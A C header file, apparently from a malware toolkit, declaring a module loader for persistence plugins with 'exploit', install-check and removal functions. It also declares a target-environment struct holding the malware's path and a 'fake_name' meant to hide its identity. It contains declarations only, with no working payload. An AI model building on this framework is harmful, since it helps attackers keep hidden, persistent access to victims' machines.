#ifndef _PERSISTENCY_HUB

#define _PERSISTENCY_HUB

#pragma region RequiredLibraries

	#include "../../headers/helpers/helpers.h"

#pragma endregion

#pragma region Configuration

	#define        MAX_MODULES                       32
	#define        MODULES_FOLDER                    "build/modules"
	#define        FUNC_NAME_IS_COMPATIBLE           "is_compatible"
	#define        FUNC_NAME_EXPLOIT                 "exploit"
	#define        FUNC_NAME_IS_INSTALLED            "is_installed"
	#define        FUNC_NAME_DELETE_INSTALLED        "delete_installed"

	#ifdef __linux__

		#define        TARGET_OPERAING_SYSTEM            LINUX
		#define        MODULE_EXTENSION                  ".so"

	#elif _WIN32

		#define        TARGET_OPERAING_SYSTEM            WINDOWS
		#define        MODULE_EXTENSION                  ".dll"

	#else

		#error Platform not supported

	#endif

#pragma endregion

#pragma region Enumerations

	typedef enum{
		WINDOWS = 0,
		LINUX = 1,
		OTHERS = 2
	} OPERATING_SYSTEM;

	typedef enum{
		X32 = 0,
		X64 = 1,
		UNKNOWN = 2
	} ARCHITECTURE;

	typedef enum{
		WITHOUT_ROOT = 0,
		WITH_ROOT = 1
	} ROOTED_STATE;

	typedef struct{
		char *fake_name;
		char *malware_path;
		char *log_filename;
		char *working_directory;
		ARCHITECTURE architecture;
		OPERATING_SYSTEM operating_system;
		ROOTED_STATE is_root;
	} ENVIRONMENT;

	typedef struct{
		int count;
		char **names;
	} MODULE_WALLET;

#pragma endregion

#pragma region TypeDefs

	typedef                 int (*MODULE_FUNC)(ENVIRONMENT *);

#pragma endregion

#pragma region Enumerations

	typedef struct{
		char *name;
		void *handle;
		MODULE_FUNC is_compatible;
		MODULE_FUNC exploit;
		MODULE_FUNC is_installed;
		MODULE_FUNC delete_installed;
	} LOADED_MODULE;

#pragma endregion

#pragma region FunctionDeclarations


	#pragma region Environment

	/**
	 * @brief Set the environment of the targetted machine and the used malware
	 * 
	 * @param env The environment object that will be setted
	 * @param os The operating system of the machine
	 * @param arch The architecture of the machine
	 * @param is_root True if the attacher has root on machine
	 * @param abs_path_to_malware Absolute path to the malware that need to gain persistency
	 * @param fake_name The aditional name of the program, used to hide its identity
	 * @param log_filename The name of the log file
	 * @return int Zero if success, non-zero if error
	 */
	int set_environment(ENVIRONMENT **env, OPERATING_SYSTEM os, ARCHITECTURE arch, ROOTED_STATE is_root, const char *abs_path_to_malware, const char *fake_name, const char *log_filename);

	/**
	 * @brief Automatically set the machine details and the malware path
	 * @param env The logger object that will be setted
	 * @param fake_name The aditional name of the program, used to hide its identity
	 * @param log_filename The name of the log file
	 * @return int Zero if success, non-zero if error
	 */
	int autoset_environment(ENVIRONMENT **env, const char *fake_name, const char *log_filename);

	/**
	 * @brief Free the already setted environment
	 * 
	 * @param env The environment object that will be freed
	 * @return int Zero if success, non-zero if error
	 */
	int free_environment(ENVIRONMENT **env);

	#pragma endregion

	#pragma region Logging

	/**
	 * @brief Log a message inside the log file
	 * 
	 * @param message The message that will be logged
	 * @return int Zero if success, non-zero if error
	 */
	int log_message(const char *message);

	#pragma endregion

	#pragma region ModuleWallet

	/**
	 * @brief Get the all modules from the local setup
	 * 
	 * @param wallet Modules holder
	 * @return int Zero if success, non-zero if error
	 */
	int get_all_modules(MODULE_WALLET **wallet);

	/**
	 * @brief Free the already setted module wallet
	 * 
	 * @param wallet The module wallet that will be freed
	 * @return int Zero if success, non-zero if error
	 */
	int free_module_wallet(MODULE_WALLET **wallet);

	#pragma endregion

	#pragma region Module

	/**
	 * @brief Verify if a module is installed in the toolkit
	 * 
	 * @param wallet The module wallet, preloaded with all the modules
	 * @param name The name of the module that will be
	 * @return int Negative if not found and positive(or zero) if found, more exactly the index in the wallet
	 */
	int is_module_present(MODULE_WALLET *wallet, const char *name);

	/**
	 * @brief Load a module in the memory
	 * 
	 * @param module The location where the module will be loaded
	 * @param name The nme of the module
	 * @return int Zero if success, non-zero if error
	 */
	int load_module(LOADED_MODULE **module, const char *name);

	/**
	 * @brief Unlink a module
	 * 
	 * @param module The loaded module that need to be unlinked
	 * @return int Zero if success, non-zero if error
	 */
	int unlink_module(LOADED_MODULE **module);

	#pragma endregion

#pragma endregion

#endif